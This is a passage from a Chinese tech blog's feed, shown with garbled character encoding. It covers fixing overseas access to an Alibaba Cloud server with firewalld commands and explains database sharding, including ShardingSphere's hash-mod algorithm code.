      <link href="/2024/03/04/2024-3-4-%E6%B5%B7%E5%A4%96%E8%AE%BF%E9%97%AE%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%A4%B1%E8%B4%A5/"/>
      <url>/2024/03/04/2024-3-4-%E6%B5%B7%E5%A4%96%E8%AE%BF%E9%97%AE%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="æµ·å¤–è®¿é—®é˜¿é‡Œäº‘æœåŠ¡å™¨å¤±è´¥"><a href="#æµ·å¤–è®¿é—®é˜¿é‡Œäº‘æœåŠ¡å™¨å¤±è´¥" class="headerlink" title="æµ·å¤–è®¿é—®é˜¿é‡Œäº‘æœåŠ¡å™¨å¤±è´¥"></a>æµ·å¤–è®¿é—®é˜¿é‡Œäº‘æœåŠ¡å™¨å¤±è´¥</h3><p>ç”±äºæˆ‘çš„å›¾åºŠæ˜¯æŒ‚åœ¨githubä¸Š,ç„¶åä½¿ç”¨cloudflareçš„CDNåŠ é€Ÿ,ä½†åœ¨å›½å†…è®¿é—®æ—¶,å›¾ç‰‡çš„åŠ è½½é€Ÿåº¦ä»ç„¶è¾ƒæ…¢,æ‰€ä»¥æˆ‘ç»å¸¸ä½¿ç”¨é­”æ³•è®¿é—®å·²è·å¾—æ›´å¥½çš„ä½“éªŒã€‚ä½†æˆ‘å‘ç°,æœ€è¿‘ä½¿ç”¨é­”æ³•è®¿é—®æ—¶,æˆ‘æ— æ³•è®¿é—®åˆ°æˆ‘çš„ç½‘ç«™ã€‚æˆ‘å»æ£€æŸ¥äº†ä¸‹,å®‰å…¨ç»„è§„åˆ™é…ç½®æ˜¯æ²¡é—®é¢˜çš„,é‚£ä¹ˆåŸå› å¾ˆå¯èƒ½å°±å‡ºç°åœ¨é˜²ç«å¢™ä¸Š.</p><p>æˆ‘å»æ£€æŸ¥äº†ä¸‹,å‘ç°æˆ‘çš„æœåŠ¡å™¨æ ¹æœ¬å°±æ²¡å¼€é˜²ç«å¢™,è¿™æ˜¯ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„äº‹,æ²¡å¼€å°±ä¸åº”è¯¥æœ‰é—®é¢˜å•Š.ç„¶åæˆ‘å°è¯•å°†é˜²ç«å¢™æ‰“å¼€,å¼€æ”¾80å’Œ443ç«¯å£,é‡å¯é˜²ç«å¢™,ç„¶åå°±å¯ä»¥æˆåŠŸè®¿é—®äº†.</p><p>æ­¥éª¤å¦‚ä¸‹:</p><h4 id="æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€"><a href="#æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€" class="headerlink" title="æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€:"></a>æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure><h4 id="æ‰“å¼€é˜²ç«å¢™"><a href="#æ‰“å¼€é˜²ç«å¢™" class="headerlink" title="æ‰“å¼€é˜²ç«å¢™"></a>æ‰“å¼€é˜²ç«å¢™</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start firewalld</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹å·²å¼€æ”¾çš„ç«¯å£"><a href="#æŸ¥çœ‹å·²å¼€æ”¾çš„ç«¯å£" class="headerlink" title="æŸ¥çœ‹å·²å¼€æ”¾çš„ç«¯å£"></a>æŸ¥çœ‹å·²å¼€æ”¾çš„ç«¯å£</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --list-ports</span><br></pre></td></tr></table></figure><h4 id="æ‰“å¼€80å’Œ443ç«¯å£"><a href="#æ‰“å¼€80å’Œ443ç«¯å£" class="headerlink" title="æ‰“å¼€80å’Œ443ç«¯å£"></a>æ‰“å¼€80å’Œ443ç«¯å£</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">firewall-cmd --zone=public --add-port=443/tcp --permanent</span><br></pre></td></tr></table></figure><h4 id="é‡å¯é˜²ç«å¢™"><a href="#é‡å¯é˜²ç«å¢™" class="headerlink" title="é‡å¯é˜²ç«å¢™"></a>é‡å¯é˜²ç«å¢™</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®åº“åˆ†åº“åˆ†è¡¨</title>
      <link href="/2024/03/02/2024-3-2-%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8/"/>
      <url>/2024/03/02/2024-3-2-%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="æ•°æ®åº“åˆ†åº“åˆ†è¡¨"><a href="#æ•°æ®åº“åˆ†åº“åˆ†è¡¨" class="headerlink" title="æ•°æ®åº“åˆ†åº“åˆ†è¡¨"></a>æ•°æ®åº“åˆ†åº“åˆ†è¡¨</h2><h3 id="åˆ†åº“åˆ†è¡¨åˆ°åº•æ˜¯ä»€ä¹ˆ"><a href="#åˆ†åº“åˆ†è¡¨åˆ°åº•æ˜¯ä»€ä¹ˆ" class="headerlink" title="åˆ†åº“åˆ†è¡¨åˆ°åº•æ˜¯ä»€ä¹ˆ"></a>åˆ†åº“åˆ†è¡¨åˆ°åº•æ˜¯ä»€ä¹ˆ</h3><p>åˆ†åº“åˆ†è¡¨å…¶å®æ˜¯åˆ†åº“,åˆ†è¡¨,åˆ†åº“åˆ†è¡¨çš„æ€»ç§°</p><h4 id="åˆ†åº“"><a href="#åˆ†åº“" class="headerlink" title="åˆ†åº“"></a>åˆ†åº“</h4><p>å°†æ•°æ®æŒ‰ç…§ä¸€å®šè§„åˆ™å­˜å‚¨åˆ°ä¸åŒçš„æ•°æ®åº“ä¸­,æ¯ä¸ªæ•°æ®åº“å­˜å‚¨ä¸€éƒ¨åˆ†æ•°æ®</p><p><code>åˆ†åº“ä¸»è¦è§£å†³çš„æ˜¯å¹¶å‘é‡è¿‡å¤§çš„é—®é¢˜</code>ï¼Œå¹¶å‘é‡ä¸€æ—¦ä¸Šå‡ï¼Œé‚£ä¹ˆæ•°æ®åº“å°±å¯èƒ½æˆä¸ºç³»ç»Ÿçš„ç“¶é¢ˆï¼Œå› ä¸ºæ•°æ®åº“çš„è¿æ¥æ•°é‡æ˜¯æœ‰ä¸Šé™çš„ï¼Œè™½ç„¶å¯ä»¥è¿›è¡Œè°ƒæ•´ï¼Œä½†å¹¶ä¸æ˜¯æ— é™è°ƒæ•´çš„ã€‚æ‰€ä»¥ï¼Œå½“æ•°æ®åº“çš„è¯»æˆ–è€…å†™çš„ QPS(æ¯ç§’æŸ¥è¯¢æ•°) å¤ªé«˜ï¼Œä»è€Œå¯¼è‡´ä½ çš„æ•°æ®åº“è¿æ¥æ•°é‡ä¸è¶³çš„æ—¶å€™ï¼Œå°±éœ€è¦è€ƒè™‘åˆ°åˆ†åº“äº†ï¼Œé€šè¿‡åœ¨å¢åŠ æ•°æ®åº“å®ä¾‹çš„æ–¹å¼æ¥æä¾›æ›´å¤šçš„æ•°æ®åº“è¿æ¥ï¼Œä»è€Œæå‡ç³»ç»Ÿçš„å¹¶å‘åº¦ã€‚<br>è¿™é‡Œæ‹¿ä¸€ä¸ªç”µå•†ç³»ç»Ÿçš„æ•°æ®åº“æ¥ä¸¾ä¾‹ï¼Œå½“ä½ å¾®æœåŠ¡åœ¨åšæœåŠ¡æ‹†åˆ†çš„æ—¶å€™ï¼Œä½ ä¼šæŒ‰ç…§åŠŸèƒ½æ¨¡å—å»æŠŠä½ çš„ç³»ç»Ÿè¿›è¡ŒæœåŠ¡æ‹†åˆ†ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå°±éœ€è¦å°†æ¯ä¸ªæ¨¡å—çš„æ•°æ®ä»ä¸€ä¸ªå•ç‹¬çš„æ•°æ®åº“ä¸­æ‹†å¼€ï¼Œåˆ†æˆè®¢å•ã€ç‰©æµã€å•†å“ã€ç”¨æˆ·ç­‰å¤šä¸ªæ•°æ®åº“ï¼Œç„¶åéšç€ä¸šåŠ¡çš„å‘å±•ï¼Œæ¯ä¸ªå•ç‹¬çš„ä¸šåŠ¡æ•°æ®åº“ä¹Ÿéœ€è¦è¿›è¡Œåˆ†åº“äº†ï¼Œå¦‚ä¸‹å›¾æ‰€æ˜¯ã€‚</p><p><img src="https://pb01.s3.bitiful.net/154.png" alt="avatar"></p><h4 id="åˆ†è¡¨"><a href="#åˆ†è¡¨" class="headerlink" title="åˆ†è¡¨"></a>åˆ†è¡¨</h4><p>å°†ä¸€å¼ è¡¨æŒ‰ç…§ä¸€å®šè§„åˆ™æ‹†åˆ†æˆå¤šå¼ è¡¨,æ¯å¼ è¡¨å­˜å‚¨ä¸€éƒ¨åˆ†æ•°æ®</p><p><code>ç›¸æ¯”è¾ƒäºåˆ†åº“ï¼Œåˆ†è¡¨ä¸»è¦è§£å†³çš„æ˜¯æ•°æ®é‡å¤§çš„é—®é¢˜</code>ï¼Œå³é€šè¿‡å°†æ•°æ®æ‹†åˆ†åˆ°å¤šä¸ªè¡¨ï¼Œå‡å°‘å•è¡¨çš„æ•°æ®é‡ï¼Œä»è€Œæå‡æŸ¥è¯¢é€Ÿåº¦ã€‚</p><h4 id="åˆ†åº“åˆ†è¡¨"><a href="#åˆ†åº“åˆ†è¡¨" class="headerlink" title="åˆ†åº“åˆ†è¡¨"></a>åˆ†åº“åˆ†è¡¨</h4><p>è¿™ä¸€èˆ¬å‘ç”Ÿåœ¨æ•°æ®åº“è¿æ¥ä¸å¤Ÿï¼ˆåˆ†åº“è§£å†³çš„é—®é¢˜ï¼‰ä»¥åŠå•è¡¨æ•°æ®é‡è¿‡å¤§å¯¼è‡´æŸ¥è¯¢é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼ˆåˆ†è¡¨è§£å†³çš„é—®é¢˜ï¼‰è¿™ä¸¤ä¸ªé—®é¢˜å…±åŒå­˜åœ¨çš„æ—¶å€™ï¼Œä¸è¿‡åœ¨åˆ†åº“åˆ†è¡¨ä¹‹å‰ï¼Œå¯ä»¥å…ˆè€ƒè™‘ä¸€ä¸‹èƒ½ä¸èƒ½ä¼˜åŒ–å…ˆã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œå•è¡¨çš„è¡Œæ•°å¦‚æœè¶…è¿‡äº† 1000 ä¸‡è¡Œä¹‹åï¼Œå°±éœ€è¦è€ƒè™‘åšåˆ†åº“åˆ†è¡¨äº†ï¼Œå°äºè¿™ä¸ªæ•°æ®é‡çš„æ—¶å€™ï¼Œé‡åˆ°æ€§èƒ½é—®é¢˜å¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼æ¥è¿›è¡Œä¼˜åŒ–ã€‚ä½†å…¶å®è¿™ä¹ˆè¯´æ˜¯ä¸å‡†ç¡®çš„,éœ€è¦æ ¹æ®è¡¨å­—æ®µæ•°é‡ã€è¡¨ä¸­æ•°æ®æ•°é‡ä»¥åŠä¸šåŠ¡çš„å…·ä½“æƒ…å†µæ¥ç»¼åˆè€ƒè™‘,æ— æ³•ç»™å‡ºä¸€ä¸ªç¡®åˆ‡çš„å€¼.</p><ul><li><strong>å¸¸â»…çš„ä¼˜åŒ–æ‰‹æ®µ</strong></li></ul><ol><li>æ•°æ®åº“çš„åŸºæœ¬ä¼˜åŒ–ï¼šåšå¥½ç´¢å¼•ã€å‡å°‘å¤šè¡¨ joinã€å‡å°‘å†—ä½™å­—æ®µ</li><li>å‡å°‘æ•°æ®åº“å‹åŠ›ï¼šåœ¨æ•°æ®åº“ä¹‹å‰åŠ ä¸€å±‚ç¼“å­˜ï¼ŒæŠŠä¸€äº›å¯ä»¥æ¥å—å»¶è¿Ÿçš„ï¼Œä»¥åŠæ•°æ®åº“å˜åŒ–é¢‘ç‡è¾ƒä½çš„å†…å®¹æ”¾åˆ°æœ¬åœ°ç¼“å­˜æˆ–è€…åˆ†å¸ƒå¼ç¼“å­˜å½“ä¸­ã€‚</li><li>å†·çƒ­æ•°æ®çš„éš”ç¦»ï¼šå³æ•°æ®å½’æ¡£ï¼Œå¯ä»¥å°†ä¸€äº›æ›´æ–°ä»¥åŠä¸ç»å¸¸ä½¿ç”¨çš„æ•°æ®å•ç‹¬éš”ç¦»å‡ºæ¥ï¼Œå¯ä»¥æ”¾åˆ°å†å²è¡¨æˆ–è€…ç¦»çº¿æ•°ä»“å½“ä¸­ï¼Œå‡å°‘è¡¨ä¸­çš„æ•°æ®é‡æ¥æå‡æ•ˆç‡</li><li>æ•°æ®åº“åˆ†åŒºï¼šæ•°æ®åº“åˆ†åŒºä¹‹åï¼Œå°†æ•°æ®å­˜å‚¨åœ¨ä¸åŒçš„è¡¨å½“ä¸­ï¼Œå°½é‡å‡å°‘å•è¡¨çš„æ•°æ®é‡ï¼Œæå‡æŸ¥è¯¢æ€§èƒ½ã€‚</li><li>åˆ†å¸ƒå¼æ•°æ®åº“ï¼šå°†æ•°æ®åˆ†æ•£åˆ°å¤šä¸ªèŠ‚ç‚¹ä¸Šï¼Œæå‡å®¹é‡</li></ol><h4 id="åˆ†åŒºå’Œåˆ†è¡¨çš„åŒºåˆ«"><a href="#åˆ†åŒºå’Œåˆ†è¡¨çš„åŒºåˆ«" class="headerlink" title="åˆ†åŒºå’Œåˆ†è¡¨çš„åŒºåˆ«"></a>åˆ†åŒºå’Œåˆ†è¡¨çš„åŒºåˆ«</h4><p>æˆ‘ä»¬ä¸Šé¢æè¿‡ä¸€ä¸ªç‚¹ï¼Œå°±æ˜¯åœ¨æ•°æ®åº“ä¸­ï¼Œå¦‚æœæ•°æ®é‡æ¯”è¾ƒå¤§çš„è¯ï¼Œä¼˜å…ˆè€ƒè™‘çš„æ˜¯å¦‚ä½•å¯¹æ•°æ®è¿›è¡Œä¼˜åŒ–ï¼Œè€Œä¸æ˜¯è¿›è¡Œåˆ†åº“åˆ†è¡¨ï¼Œæˆ‘ä»¬åœ¨ä¼˜åŒ–é‡Œé¢æåˆ°äº†ä¸€ä¸ªç‚¹ï¼Œå°±æ˜¯å¯¹æ•°æ®å®ç°åˆ†åŒºæ“ä½œï¼Œé‚£ä¹ˆè¿™ä¸ªè¿‡ç¨‹è¦æ€ä¹ˆç†è§£å‘¢ï¼Ÿä»¥åŠè¿™ä¸¤ä¸ªè¿‡ç¨‹æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p><p>é¦–å…ˆæˆ‘ä»¬å…ˆè¯´ä¸€ä¸ªç‚¹ï¼Œå°±æ˜¯åˆ†åŒºå’Œåˆ†è¡¨ç›¸åŒçš„ç‚¹ï¼Œéƒ½æ˜¯æŒ‰ç…§ä¸€å®šçš„è§„åˆ™ï¼Œå¯¹ä¸€å¼ æ•°æ®é‡ç‰¹åˆ«å¤§çš„è¡¨è¿›è¡Œåˆ†è§£ï¼Œä½¿å¾—è¡¨çš„æ•°æ®é‡å‡å°‘ï¼Œä»è€Œæé«˜æŸ¥è¯¢æ•ˆç‡ã€‚è¿™æ ·å¬èµ·æ¥ä½ å¯èƒ½æ„Ÿè§‰æ²¡å·®å¤šå°‘ï¼Œå› ä¸ºä¸¤è€…çš„åŒºåˆ«éƒ½æ˜¯æŠŠè¡¨è¿›è¡Œæ‹†åˆ†ï¼Œé‚£å…·ä½“æœ‰ä»€ä¹ˆå·®åˆ«å—ï¼Ÿä¸»è¦å°±æ˜¯åˆ†åŒºå’Œåˆ†è¡¨åæ•°æ®çš„å­˜å‚¨æ–¹å¼å‘ç”Ÿäº†å˜åŒ–ã€‚</p><p>è¿™ä¸ªè¦ä» MySQL çš„ç´¢å¼•è¯´èµ·ï¼Œåœ¨ Innodb ä¸­ï¼ˆ8.0ä¹‹å‰ï¼‰ï¼Œè¡¨å­˜å‚¨ä¸»è¦ä¾èµ–ä¸¤ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯ .frm æ–‡ä»¶å’Œ.ibd æ–‡ä»¶ã€‚.frmæ–‡ä»¶ç”¨äºå­˜å‚¨è¡¨ç»“æ„å®šä¹‰ä¿¡æ¯ï¼Œè€Œ.ibdæ–‡ä»¶åˆ™ç”¨äºå­˜å‚¨è¡¨æ•°æ®ã€‚</p><p>æ‹¿orderè¡¨æ¥ä¸¾ä¾‹,åˆ†åŒºå­˜å‚¨æ—¶ä¼šåœ¨ MySQL çš„ data ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç”¨æˆ·å+è¡¨å+åˆ†åŒºå.ibd çš„æ–‡ä»¶ï¼ˆå¦‚ï¼šorder_p1.ibdï¼‰ï¼Œç”¨æ¥å­˜å‚¨ order è¡¨ä¸­ç¬¬ä¸€ä¸ªåˆ†åŒºçš„æ•°æ®ï¼ŒåŒæ ·ä¼šæœ‰ order_p2.ibd å’Œorder_p3.ibd æ¥å­˜å‚¨ç¬¬äºŒå’Œç¬¬ä¸‰ä¸ªåˆ†åŒºçš„æ•°æ®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">order_p1.ibd</span><br><span class="line">order_p2.ibd</span><br><span class="line">order_p3.ibd</span><br><span class="line">order.frm</span><br></pre></td></tr></table></figure><p>åˆ†è¡¨å­˜å‚¨çš„æ—¶å€™ä¼šåœ¨ MySQL çš„ Data ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåç¼€ä¸º .frmï¼Œåå­—ä¸ºâ€order_1.frmâ€çš„è¡¨æ ¼æ–‡ä»¶ï¼Œå­˜å‚¨ orderè¡¨ä¸­ç¬¬ä¸€ä¸ªåˆ†è¡¨çš„æ•°æ®ï¼ŒåŒæ ·ä¼šæœ‰å¦å¤–çš„ order_2.frm å’Œorder_3.frm æ¥å­˜å‚¨ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªåˆ†è¡¨çš„æ•°æ®:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">order_1.ibd</span><br><span class="line">order_1.frm</span><br><span class="line">order_2.ibd</span><br><span class="line">order_2.frm</span><br><span class="line">order_3.ibd</span><br><span class="line">order_3.frm</span><br></pre></td></tr></table></figure><p><code>æ‰€ä»¥ç®€å•æ¥è¯´,ä¸¤è€…çš„åŒºåˆ«æ˜¯:</code></p><ul><li>æ•°æ®åœ¨åšäº†åˆ†åŒºåï¼Œè¡¨é¢æ˜¯è¿˜æ˜¯åªæœ‰ä¸€å¼ è¡¨ï¼Œåªä¸è¿‡æ•°æ®ä¿å­˜åœ¨ä¸åŒçš„ä½ç½®ä¸Šäº†ï¼ˆåŒä¸€ä¸ª.frmæ–‡ä»¶ï¼‰ï¼Œåœ¨åšæ•°æ®è¯»å–çš„æ—¶å€™æ“ä½œçš„è¡¨åè¿˜æ˜¯usersè¡¨ï¼Œæ•°æ®åº“ä¼šè‡ªå·±å»ç»„ç»‡å„ä¸ªåˆ†åŒºçš„æ•°æ®ã€‚</li><li>æ•°æ®åœ¨è¿›è¡Œäº†åˆ†è¡¨åï¼Œä¸ç®¡æ˜¯è¡¨é¢ä¸Šè¿˜æ˜¯å®é™…ä¸Šï¼Œéƒ½å·²ç»ä¸æ˜¯åŒä¸€å¼ è¡¨äº†ï¼Œå…¶åˆ†æˆäº†å¤šå¼ è¡¨ï¼ˆå¤šä¸ª.frm æ–‡ä»¶ ï¼‰ã€‚æ‰€ä»¥æ•°æ®åº“åœ¨è¿›è¡Œæ“ä½œçš„æ—¶å€™éœ€è¦å»æŒ‡å®šå¯¹åº”çš„è¡¨å</li></ul><h3 id="å¦‚ä½•åˆ†åº“åˆ†è¡¨"><a href="#å¦‚ä½•åˆ†åº“åˆ†è¡¨" class="headerlink" title="å¦‚ä½•åˆ†åº“åˆ†è¡¨"></a>å¦‚ä½•åˆ†åº“åˆ†è¡¨</h3><p>åˆ†åº“å’Œåˆ†è¡¨éƒ½æœ‰ä¸¤ç§æ‹†åˆ†æ–¹å¼ï¼Œä¸€ç§æ˜¯å‚ç›´æ‹†åˆ†ï¼Œä¸€ç§æ˜¯æ°´å¹³æ‹†åˆ†ã€‚</p><h4 id="å‚ç›´æ‹†åˆ†"><a href="#å‚ç›´æ‹†åˆ†" class="headerlink" title="å‚ç›´æ‹†åˆ†"></a>å‚ç›´æ‹†åˆ†</h4><p>å‚ç›´æ‹†åˆ†å°±æ˜¯é€šè¿‡å°†æ•°æ®åº“è¡¨ä¸­çš„å­—æ®µå‡å°‘ï¼Œç„¶åæ•°æ®çš„è¡Œæ•°ä¸å˜ï¼Œåˆ—æ•°å‡å°‘ï¼Œæ¥ä½¿å¾—æ¯ä¸ªè¡¨ä¸­çš„æ•°æ®é‡ä¸‹é™.æ¯”å¦‚ä¹‹å‰æåˆ°çš„ç”µå•†æ•°æ®åº“,å°†å…¶æ‹†åˆ†ä¸ºè®¢å•æ•°æ®åº“,å•†å“æ•°æ®åº“,ç”¨æˆ·æ•°æ®åº“ç­‰,è¿™å°±å±äºå‚ç›´æ‹†åˆ†.å¦‚æœå°†ç”¨æˆ·è¡¨å¸¸ç”¨ä¿¡æ¯åˆ†ä¸ºç”¨æˆ·ä¸»è¡¨,ä¸å¸¸ç”¨ä¿¡æ¯åˆ†ä¸ºç”¨æˆ·æ‰©å±•è¡¨,å°±æ˜¯è¡¨çš„å‚ç›´æ‹†åˆ†.å‚ç›´æ‹†åˆ†ä¸»è¦æ˜¯æ ¹æ®<code>ä¸šåŠ¡</code>æ¥å†³å®šçš„,ä¸åŒçš„ä¸šåŠ¡æœ‰ç€ä¸åŒçš„æ‹†åˆ†æ–¹æ¡ˆ.</p><h4 id="æ°´å¹³æ‹†åˆ†"><a href="#æ°´å¹³æ‹†åˆ†" class="headerlink" title="æ°´å¹³æ‹†åˆ†"></a>æ°´å¹³æ‹†åˆ†</h4><p>æ°´å¹³æ‹†åˆ†å°±æ˜¯å°†æ•°æ®åº“ä¸­çš„è¡¨æ•°æ®åˆ†æ•£åˆ°å¤šä¸ªè¡¨ä¸­ï¼Œå³æ•°æ®è¡¨ä¸­åˆ—æ•°ä¸å˜ï¼Œè¡Œæ•°å‡å°‘ï¼Œæ¥ä½¿å¾—æ¯ä¸ªè¡¨ä¸­çš„æ•°æ®é‡ä¸‹é™.æ°´å¹³æ‹†åˆ†çš„<code>å…³é”®</code>åœ¨äº<strong>åˆ†ç‰‡é”®çš„é€‰æ‹©</strong>,åˆ†ç‰‡é”®æ˜¯ç”¨äºå°†æ•°æ®åº“ï¼ˆè¡¨ï¼‰æ°´å¹³æ‹†åˆ†çš„æ•°æ®åº“å­—æ®µ,å®ƒç›´æ¥å½±å“äº†åˆ†åº“åˆ†è¡¨çš„æ€§èƒ½å’Œå¯æ‰©å±•æ€§ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›é€‰æ‹©åˆ†ç‰‡é”®çš„å…³é”®å› ç´ ï¼š</p><ul><li>é€‰æ‹©ä¸€ä¸ª<code>å°½é‡å‡åŒ€</code>çš„åˆ†ç‰‡é”®ï¼Œè¿™æ ·å¯ä»¥ä½¿å¾—æ•°æ®å°½é‡å‡åŒ€çš„åˆ†å¸ƒåˆ°å„ä¸ªæ•°æ®åº“ä¸­,é¿å…å‡ºç°çƒ­ç‚¹æ•°æ®é›†ä¸­åœ¨æŸä¸ªåˆ†ç‰‡ä¸Šçš„æƒ…å†µã€‚</li><li>é€‰æ‹©ä¸€ä¸ª<code>å°½é‡å”¯ä¸€</code>çš„åˆ†ç‰‡é”®ï¼Œè¿™æ ·å¯ä»¥é¿å…æ•°æ®é‡å¤ï¼Œæé«˜æ•°æ®çš„å”¯ä¸€æ€§ã€‚</li><li>é€‰æ‹©ä¸€ä¸ª<code>å°½é‡ä¸å˜</code>çš„åˆ†ç‰‡é”®ï¼Œè¿™æ ·å¯ä»¥é¿å…å¯¹æ‹†åˆ†ç»“æœçš„å¤šæ¬¡ä¿®æ”¹ï¼Œæé«˜ç³»ç»Ÿçš„ç¨³å®šæ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</li><li>é€‰æ‹©åˆ†ç‰‡é”®è¿˜åº”è€ƒè™‘æ•°æ®çš„è®¿é—®é¢‘ç‡ã€‚å°†ç»å¸¸è®¿é—®çš„æ•°æ®æ”¾åœ¨åŒä¸€ä¸ªåˆ†ç‰‡ä¸Šï¼Œå¯ä»¥æé«˜æŸ¥è¯¢æ€§èƒ½å’Œé™ä½è·¨åˆ†ç‰‡æŸ¥è¯¢çš„å¼€é”€ã€‚</li></ul><h4 id="å¸¸è§çš„æ°´å¹³æ‹†åˆ†ç®—æ³•"><a href="#å¸¸è§çš„æ°´å¹³æ‹†åˆ†ç®—æ³•" class="headerlink" title="å¸¸è§çš„æ°´å¹³æ‹†åˆ†ç®—æ³•"></a>å¸¸è§çš„æ°´å¹³æ‹†åˆ†ç®—æ³•</h4><h5 id="å“ˆå¸Œå–æ¨¡-HASH-MOD"><a href="#å“ˆå¸Œå–æ¨¡-HASH-MOD" class="headerlink" title="å“ˆå¸Œå–æ¨¡(HASH_MOD)"></a>å“ˆå¸Œå–æ¨¡(HASH_MOD)</h5><p>è¿™æ˜¯æœ€å¸¸ç”¨çš„æ°´å¹³æ‹†åˆ†ç®—æ³•ï¼Œå®ƒé€šè¿‡å°†åˆ†ç‰‡é”®çš„å“ˆå¸Œå€¼å¯¹åˆ†ç‰‡æ•°é‡å–æ¨¡ï¼Œæ¥ç¡®å®šæ•°æ®åº”è¯¥å­˜å‚¨çš„åˆ†ç‰‡ã€‚å“ˆå¸Œå€¼å¯èƒ½å‡ºç°è´Ÿæ•°,è¦å…ˆå¯¹å…¶æ±‚ç»å¯¹å€¼ä¹‹åå†å–æ¨¡,ä¸‹é¢æ˜¯ShardingSphereä¸­HASH_MODç®—æ³•çš„å®ç°:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">HashModShardingAlgorithm</span> <span class="keyword">implements</span> <span class="title class_">StandardShardingAlgorithm</span>&lt;Comparable&lt;?&gt;&gt;, ShardingAutoTableAlgorithm &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SHARDING_COUNT_KEY</span> <span class="operator">=</span> <span class="string">&quot;sharding-count&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> shardingCount;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(<span class="keyword">final</span> Properties props)</span> &#123;</span><br><span class="line">        shardingCount = getShardingCount(props);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getShardingCount</span><span class="params">(<span class="keyword">final</span> Properties props)</span> &#123;</span><br><span class="line">        ShardingSpherePreconditions.checkState(props.containsKey(SHARDING_COUNT_KEY), () -&gt; <span class="keyword">new</span> <span class="title class_">ShardingAlgorithmInitializationException</span>(getType(), <span class="string">&quot;Sharding count cannot be null.&quot;</span>));</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.parseInt(String.valueOf(props.getProperty(SHARDING_COUNT_KEY)));</span><br><span class="line">        ShardingSpherePreconditions.checkState(result &gt; <span class="number">0</span>, () -&gt; <span class="keyword">new</span> <span class="title class_">ShardingAlgorithmInitializationException</span>(getType(), <span class="string">&quot;Sharding count must be a positive integer.&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title 